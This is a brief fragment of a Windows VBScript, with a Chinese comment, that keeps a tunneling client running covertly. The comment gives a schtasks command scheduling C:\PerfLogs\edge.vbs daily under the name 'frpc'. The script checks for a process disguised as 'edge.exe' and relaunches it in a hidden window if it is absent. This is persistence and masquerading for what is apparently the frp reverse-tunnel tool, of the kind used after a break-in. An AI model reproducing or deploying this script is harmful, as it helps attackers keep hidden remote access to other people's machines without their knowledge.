...
' 4、添加进计划任务：schtasks.exe /create /tn "frpc" /tr "C:\PerfLogs\edge.vbs" /sc daily /st 07:00:00
...
Set procfrp = proc.ExecQuery("select * from win32_process where name = 'edge.exe'")
For Each pf In procfrp
  frpProcess = True 
Next
set objShell = WScript.CreateObject("WScript.Shell")
If Not frpProcess Then objShell.Run (dir_run & n2n), 0 End If
WScript.Quit
